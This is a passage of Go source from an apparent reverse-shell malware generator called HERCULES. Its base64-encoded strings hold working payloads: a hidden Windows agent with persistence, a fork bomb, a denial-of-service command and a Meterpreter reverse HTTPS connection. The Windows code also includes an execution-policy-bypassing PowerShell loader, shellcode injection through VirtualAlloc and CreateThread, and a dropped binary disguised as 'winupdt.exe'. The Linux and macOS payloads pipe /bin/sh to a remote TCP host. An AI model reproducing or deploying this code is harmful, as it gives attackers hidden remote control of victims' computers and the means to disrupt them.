RXhlYy5TeXNQcm9jQXR0ciA9ICZzeXNjYWxsLlN5c1Byb2NBdHRye0hpZGVXaW5kb3c6IHRydWV9OwogIEV4ZWMuU3RhcnQoKTsKCn0KCgp2YXIgQkFOTkVSIHN0cmluZyA9IGAKICAgICAgICAgICAgICAgICAgX18gIF9fX19fX19fX19fXyAgX19fX19fX18gIF9fX18gICAgX19fX19fX19fX18KICAgICAgICAgICAgICAgICAvIC8gLyAvIF9fX18vIF9fIFwvIF9fX18vIC8gLyAvIC8gICAvIF9fX18vIF9fXy8KICAgICAgICAgICAgICAgIC8gL18vIC8gX18vIC8gL18vIC8gLyAgIC8gLyAvIC8gLyAgIC8gX18vICBcX18gXCAKICAgICAgICAgICAgICAgLyBfXyAgLyAvX19fLyBfLCBfLyAvX19fLyAvXy8gLyAvX19fLyAvX19fIF9fXy8gLyAKICAgICAgICAgICAgICAvXy8gL18vX19fX18vXy8gfF98XF9fX18vXF9fX18vX19fX18vX19fX18vL19fX18vICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCgojIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIEhFUkNVTEVTIFJFVkVSU0UgU0hFTEwgIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIwpgCgoKCgp2YXIgSEVMUCBzdHJpbmcgPSBgCgogICAgICAgICAgICAgICAgICBfXyAgX19fX19fX19fX19fICBfX19fX19fXyAgX19fXyAgICBfX19fX19fX19fXwogICAgICAgICAgICAgICAgIC8gLyAvIC8gX19fXy8gX18gXC8gX19fXy8gLyAvIC8gLyAgIC8gX19fXy8gX19fLwogICAgICAgICAgICAgICAgLyAvXy8gLyBfXy8gLyAvXy8gLyAvICAgLyAvIC8gLyAvICAgLyBfXy8gIFxfXyBcIAogICAgICAgICAgICAgICAvIF9fICAvIC9fX18vIF8sIF8vIC9fX18vIC9fLyAvIC9fX18vIC9fX18gX19fLyAvIAogICAgICAgICAgICAgIC9fLyAvXy9fX19fXy9fLyB8X3xcX19fXy9cX19fXy9fX19fXy9fX19fXy8vX19fXy8gIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKCiMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMgSEVSQ1VMRVMgUkVWRVJTRSBTSEVMTCAjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjCgoKCn5QRVJTU0lTVEVOQ0UgICAgICAgICAgICAgICAgICAgICBJbnN0YWxscyBhIHBlcnNpc3RlbmNlIG1vZHVsZQoKfkRJU1RSQUNUICAgICAgICAgICAgICAgICAgICAgICAgIEV4ZWN1dGVzIGEgZm9yayBib21iIGJhdCBmaWxlIGZvciBkaXN0cmFjdGlvbiAgIAoKflBMRUFTRSAgICAgICAgICAgICAgICAgICAgICAgICAgIEFza3MgdXNlcnMgY29tZmlybWF0aW9uIGZvciBoaWdoZXIgcHJpdmlsaWRnZSBvcGVyYXRpb25zCgp+RE9TIC1BICJ3d3cudGFyZ2V0c2l0ZS5jb20iICAgICAgU3RhcnRzIGEgZGVuaWFsIG9mIHNlcnZpY2UgYXRhY2sKCn5NRVRFUlBSRVRFUiAtQSAiMTI3LjAuMC4xOjg4ODgiICBDcmVhdGVzIGEgcmV2ZXJzZSBodHRwcyBtZXRlcnByZXRlciBjb25uZWN0aW9uIHRvIG1ldGFzcGxvaXQKCn5ET1dOTE9BRCAtRiAiZmlsZW5hbWUuZXhlIiAgICAgICBTZW5kcyB0aGUgc2VsZWN0ZWQgZmlsZSB0byB5b3VyIGlwIHRocnUgNTU4ODggcG9ydAoKflVQTE9BRCAtRiAiZmlsZW5hbWUuZXhlIiAgICAgICAgIFJlbW90ZSBtYWNoaW5lIHN0YXJ0cyBsaXN0ZW5pbmcgZm9yIGZpbGUgYXQgNTU4ODggcG9ydAoKCgojIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIwoKYAoKCgoKZnVuYyBDUkVBVEVfUFNfTUVURVJQUkVURVIoRW5jb2RlZENvbXByZXNzZWRCdWZmZXIgc3RyaW5nKSAoc3RyaW5nKSB7CiAgCgoKdmFyIFNoZWxsX1RlbXBsYXRlIHN0cmluZyA9IGBAZWNobyBvZmYKaWYgJVBST0NFU1NPUl9BUkNISVRFQ1RVUkUlPT14ODYgKHBvd2Vyc2hlbGwuZXhlIC1Ob1AgLU5vbkkgLVcgSGlkZGVuIC1FeGVjIEJ5cGFzcyAtQ29tbWFuZCAiSW52b2tlLUV4cHJlc3Npb24gJChOZXctT2JqZWN0IElPLlN0cmVhbVJlYWRlciAoJChOZXctT2JqZWN0IElPLkNvbXByZXNzaW9uLkRlZmxhdGVTdHJlYW0gKCQoTmV3LU9iamVjdCBJTy5NZW1vcnlTdHJlYW0gKCwkKFtDb252ZXJ0XTo6RnJvbUJhc2U2NFN0cmluZyhcImArRW5jb2RlZENvbXByZXNzZWRCdWZmZXIrYFwiKSkpKSwgW0lPLkNvbXByZXNzaW9uLkNvbXByZXNzaW9uTW9kZV06OkRlY29tcHJlc3MpKSwgW1RleHQuRW5jb2RpbmddOjpBU0NJSSkpLlJlYWRUb0VuZCgpOyIpIGVsc2UgKCVXaW5EaXIlXHN5c3dvdzY0XHdpbmRvd3Nwb3dlcnNoZWxsXHYxLjBccG93ZXJzaGVsbC5leGUgLU5vUCAtTm9uSSAtVyBIaWRkZW4gLUV4ZWMgQnlwYXNzIC1Db21tYW5kICJJbnZva2UtRXhwcmVzc2lvbiAkKE5ldy1PYmplY3QgSU8uU3RyZWFtUmVhZGVyICgkKE5ldy1PYmplY3QgSU8uQ29tcHJlc3Npb24uRGVmbGF0ZVN0cmVhbSAoJChOZXctT2JqZWN0IElPLk1lbW9yeVN0cmVhbSAoLCQoW0NvbnZlcnRdOjpGcm9tQmFzZTY0U3RyaW5nKFwiYCtFbmNvZGVkQ29tcHJlc3NlZEJ1ZmZlcitgXCIpKSkpLCBbSU8uQ29tcHJlc3Npb24uQ29tcHJlc3Npb25Nb2RlXTo6RGVjb21wcmVzcykpLCBbVGV4dC5FbmNvZGluZ106OkFTQ0lJKSkuUmVhZFRvRW5kKCk7IikKCmAKCiAgcmV0dXJuIFNoZWxsX1RlbXBsYXRlOwoKfQoKCmZ1bmMgUkVWRVJTRV9IVFRQU19TSEVMTChJUF9QT1JUIHN0cmluZykgKHN0cmluZykgey8vbCwgXyA6PSBiYXNlNjQuU3RkRW5jb2RpbmcuRGVjb2RlKGJhc2U2NFRleHQsIFtdYnl0ZShtZXNzYWdlKSkKICAKCgpQb3dlcnNoZWxsX1JldmVyc2VfSHR0cHMsIF8gOj0gYmFzZTY0LlN0ZEVuY29kaW5nLkRlY29kZVN0cmluZyhgSkhFZ1BTQkFJZzBLVzBSc2JFbHRjRzl5ZENnaWEyVnlibVZzTXpJdVpHeHNJaWxkSUhCMVlteHBZeUJ6ZEdGMGFXTWdaWGgwWlhKdQpJRWx1ZEZCMGNpQldhWEowZFdGc1FXeHNiMk1vU1c1MFVIUnlJR3h3UVdSa2NtVnpjeXdnZFdsdWRDQmtkMU5wZW1Vc0lIVnBiblFnClpteEJiR3h2WTJGMGFXOXVWSGx3WlN3Z2RXbHVkQ0JtYkZCeWIzUmxZM1FwT3cwS1cwUnNiRWx0Y0c5eWRDZ2lhMlZ5Ym1Wc016SXUKWkd4c0lpbGRJSEIxWW14cFl5QnpkR0YwYVdNZ1pYaDBaWEp1SUVsdWRGQjBjaUJEY21WaGRHVlVhSEpsWVdRb1NXNTBVSFJ5SUd4dwpWR2h5WldGa1FYUjBjbWxpZFhSbGN5d2dkV2x1ZENCa2QxTjBZV05yVTJsNlpTd2dTVzUwVUhSeUlHeHdVM1JoY25SQlpHUnlaWE56CkxDQkpiblJRZEhJZ2JIQlFZWEpoYldWMFpYSXNJSFZwYm5RZ1pIZERjbVZoZEdsdmJrWnNZV2R6TENCSmJuUlFkSElnYkhCVWFISmwKWVdSSlpDazdEUW9pUUEwS2RISjVleVJrSUQwZ0lrRkNRMFJGUmtkSVNVcExURTFPVDFCUlVsTlVWVlpYV0ZsYVlXSmpaR1ZtWjJocAphbXRzYlc1dmNIRnljM1IxZG5kNGVYb3dNVEl6TkRVMk56ZzVJaTVVYjBOb1lYSkJjbkpoZVNncERRcG1kVzVqZEdsdmJpQmpLQ1IyCktYc2djbVYwZFhKdUlDZ29XMmx1ZEZ0ZFhTQWtkaTVVYjBOb1lYSkJjbkpoZVNncElId2dUV1ZoYzNWeVpTMVBZbXBsWTNRZ0xWTjEKYlNrdVUzVnRJQ1VnTUhneE1EQWdMV1Z4SURreUtYME5DbVoxYm1OMGFXOXVJSFFnZXlSbUlEMGdJaUk3TVM0dU0zeG1iM0psWVdObwpMVzlpYW1WamRIc2taaXM5SUNSa1d5aG5aWFF0Y21GdVpHOXRJQzF0WVhocGJYVnRJQ1JrTGt4bGJtZDBhQ2xkZlR0eVpYUjFjbTRnCkpHWTdmUTBLWm5WdVkzUnBiMjRnWlNCN0lIQnliMk5sYzNNZ2UxdGhjbkpoZVYwa2VDQTlJQ1I0SUNzZ0pGOTlPeUJsYm1RZ2V5UjQKSUh3Z2MyOXlkQzF2WW1wbFkzUWdleWh1WlhjdGIySnFaV04wSUZKaGJtUnZiU2t1Ym1WNGRDZ3BmWDE5RFFwbWRXNWpkR2x2YmlCbgpleUJtYjNJZ0tDUnBQVEE3SkdrZ0xXeDBJRFkwT3lScEt5c3BleVJvSUQwZ2REc2theUE5SUNSa0lId2daVHNnSUdadmNtVmhZMmdnCktDUnNJR2x1SUNScktYc2tjeUE5SUNSb0lDc2dKR3c3SUdsbUlDaGpLQ1J6S1NrZ2V5QnlaWFIxY200Z0pITWdmWDE5Y21WMGRYSnUKSUNJNWRsaFZJanQ5RFFwYlRtVjBMbE5sY25acFkyVlFiMmx1ZEUxaGJtRm5aWEpkT2pwVFpYSjJaWEpEWlhKMGFXWnBZMkYwWlZaaApiR2xrWVhScGIyNURZV3hzWW1GamF5QTlJSHNrZEhKMVpYMDdKRzBnUFNCT1pYY3RUMkpxWldOMElGTjVjM1JsYlM1T1pYUXVWMlZpClEyeHBaVzUwT3cwS0pHMHVTR1ZoWkdWeWN5NUJaR1FvSW5WelpYSXRZV2RsYm5RaUxDQWlUVzk2YVd4c1lTODBMakFnS0dOdmJYQmgKZEdsaWJHVTdJRTFUU1VVZ05pNHhPeUJYYVc1a2IzZHpJRTVVS1NJcE95UnVJRDBnWnpzZ1cwSjVkR1ZiWFYwZ0pIQWdQU0FrYlM1RQpiM2R1Ykc5aFpFUmhkR0VvSW1oMGRIQnpPaTh2WUN0emRISnBibWNvU1ZCZlVFOVNWQ2tyWUM4a2JpSWdLUTBLSkc4Z1BTQkJaR1F0ClZIbHdaU0F0YldWdFltVnlSR1ZtYVc1cGRHbHZiaUFrY1NBdFRtRnRaU0FpVjJsdU16SWlJQzF1WVcxbGMzQmhZMlVnVjJsdU16SkcKZFc1amRHbHZibk1nTFhCaGMzTjBhSEoxRFFva2VEMGtiem82Vm1seWRIVmhiRUZzYkc5aktEQXNKSEF1VEdWdVozUm9MREI0TXpBdwpNQ3d3ZURRd0tUdGJVM2x6ZEdWdExsSjFiblJwYldVdVNXNTBaWEp2Y0ZObGNuWnBZMlZ6TGsxaGNuTm9ZV3hkT2pwRGIzQjVLQ1J3CkxDQXdMQ0JiU1c1MFVIUnlYU2drZUM1VWIwbHVkRE15S0NrcExDQWtjQzVNWlc1bmRHZ3BEUW9rYnpvNlEzSmxZWFJsVkdoeVpXRmsKS0RBc01Dd2tlQ3d3TERBc01Da2dmQ0J2ZFhRdGJuVnNiRHNnVTNSaGNuUXRVMnhsWlhBZ0xWTmxZMjl1WkNBNE5qUXdNSDFqWVhSagphSHQ5YCkKCiAgSW5kZXggOj0gc3RyaW5ncy5SZXBsYWNlKHN0cmluZyhQb3dlcnNoZWxsX1JldmVyc2VfSHR0cHMpLCAiK3N0cmluZyhJUF9QT1JUKSsiLCBJUF9QT1JULCAtMSkKCgogIHJldHVybiBzdHJpbmcoSW5kZXgpCgp9CgoKCmZ1bmMgRElTUEFUQ0goKSB7CiAgdmFyIEVuY29kZWRCaW5hcnkgc3RyaW5nID0gIi8vSU5TRVJULUJJTkFSWS1IRVJFLy8iCgoKICBCaW5hcnksIF8gOj0gb3MuQ3JlYXRlKCJ3aW51cGR0LmV4ZSIpCgogIERlY29kZWRCaW5hcnksIF8gOj0gYmFzZTY0LlN0ZEVuY29kaW5nLkRlY29kZVN0cmluZyhFbmNvZGVkQmluYXJ5KQoKICBCaW5hcnkuV3JpdGVTdHJpbmcoc3RyaW5nKERlY29kZWRCaW5hcnkpKTsKCiAgQmluYXJ5LkNsb3NlKCkKCiAgRXhlYyA6PSBleGVjLkNvbW1hbmQoImNtZCIsICIvQyIsICJ3aW51cGR0LmV4ZSIpOwogIEV4ZWMuU3RhcnQoKTsKfQ==`
var LINUX_PAYLOAD string = `CnBhY2thZ2UgbWFpbgoKCiAKaW1wb3J0Im9zL2V4ZWMiCmltcG9ydCJuZXQiCmltcG9ydCAidGltZSIKaW1wb3J0ICJwYXRoL2ZpbGVwYXRoIgppbXBvcnQgIm9zIgoKY29uc3QgVklDVElNX0lQIHN0cmluZyA9ICIxMjcuMC4wLjEiOwpjb25zdCBWSUNUSU1fUE9SVCBzdHJpbmcgPSAiODU1MiI7CgpmdW5jIG1haW4oKXsKICAgIGNvbm5lY3QsIGVyciA6PW5ldC5EaWFsKCJ0Y3AiLFZJQ1RJTV9JUCsiOiIrVklDVElNX1BPUlQpOwogICAgaWYgZXJyICE9IG5pbCB7ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICB0aW1lLlNsZWVwKDE1KnRpbWUuU2Vjb25kKTsgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgIG1haW4oKTsgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgIH07IAogICAgZGlyLCBfIDo9IGZpbGVwYXRoLkFicyhmaWxlcGF0aC5EaXIob3MuQXJnc1swXSkpOyAgICAgCiAgICB2ZXJzaW9uX2NoZWNrIDo9IGV4ZWMuQ29tbWFuZCgic2giLCAiLWMiLCAidW5hbWUgLWEiKTsKICAgIHZlcnNpb24sIF8gOj0gdmVyc2lvbl9jaGVjay5PdXRwdXQoKTsgICAgICAgICAgIAogICAgU3lzR3VpZGUgOj0gKHN0cmluZyhkaXIpICsgIiDCoz4gIiArIHN0cmluZyh2ZXJzaW9uKSArICIgwqM+ICIpOyAgIAogICAgY29ubmVjdC5Xcml0ZShbXWJ5dGUoc3RyaW5nKFN5c0d1aWRlKSkpCiAgICBjbWQ6PWV4ZWMuQ29tbWFuZCgiL2Jpbi9zaCIpOwogICAgY21kLlN0ZGluPWNvbm5lY3Q7CiAgICBjbWQuU3Rkb3V0PWNvbm5lY3Q7CiAgICBjbWQuU3RkZXJyPWNvbm5lY3Q7CiAgICBjbWQuUnVuKCk7Cn0=`
var OSX_PAYLOAD string = `CnBhY2thZ2UgbWFpbgoKCiAKaW1wb3J0Im9zL2V4ZWMiCmltcG9ydCJuZXQiCmltcG9ydCAidGltZSIKaW1wb3J0ICJwYXRoL2ZpbGVwYXRoIgppbXBvcnQgIm9zIgoKY29uc3QgVklDVElNX0lQIHN0cmluZyA9ICIxMjcuMC4wLjEiOwpjb25zdCBWSUNUSU1fUE9SVCBzdHJpbmcgPSAiODU1MiI7CgpmdW5jIG1haW4oKXsKICAgIGNvbm5lY3QsIGVyciA6PW5ldC5EaWFsKCJ0Y3AiLFZJQ1RJTV9JUCsiOiIrVklDVElNX1BPUlQpOwogICAgaWYgZXJyICE9IG5pbCB7ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICB0aW1lLlNsZWVwKDE1KnRpbWUuU2Vjb25kKTsgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgIG1haW4oKTsgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgIH07IAogICAgZGlyLCBfIDo9IGZpbGVwYXRoLkFicyhmaWxlcGF0aC5EaXIob3MuQXJnc1swXSkpOyAgICAgCiAgICB2ZXJzaW9uX2NoZWNrIDo9IGV4ZWMuQ29tbWFuZCgic2giLCAiLWMiLCAidW5hbWUgLWEiKTsKICAgIHZlcnNpb24sIF8gOj0gdmVyc2lvbl9jaGVjay5PdXRwdXQoKTsgICAgICAgICAgIAogICAgU3lzR3VpZGUgOj0gKHN0cmluZyh2ZXJzaW9uKSk7ICAgCiAgICBjb25uZWN0LldyaXRlKFtdYnl0ZShzdHJpbmcoU3lzR3VpZGUpKSkKICAgIGNtZDo9ZXhlYy5Db21tYW5kKCIvYmluL3NoIik7CiAgICBjbWQuU3RkaW49Y29ubmVjdDsKICAgIGNtZC5TdGRvdXQ9Y29ubmVjdDsKICAgIGNtZC5TdGRlcnI9Y29ubmVjdDsKICAgIGNtZC5SdW4oKTsKfQ==`




var HELP string = `

                  __  ____________  ________  ____    ___________
                 / / / / ____/ __ \/ ____/ / / / /   / ____/ ___/
                / /_/ / __/ / /_/ / /   / / / / /   / __/  \__ \ 
               / __  / /___/ _, _/ /___/ /_/ / /___/ /___ ___/ / 
              /_/ /_/_____/_/ |_|\____/\____/_____/_____//____/  
                                                   

############################ HERCULES REVERSE SHELL ############################



Usage : ./HERCULES <Local Ip> <Local Port> <options>


Options : 

      -p                 Payload to use. ( Windows / Linux / OSX )

      -a                 The architecture to use. ( x86, x64 )
      
      -l                 Specify linking type for compiler. ( static, dynamic )

      --persistence      Enable outo persistence option for continious acces.

      --embed="file.exe" Embed the selected payload with selected exe file.


`

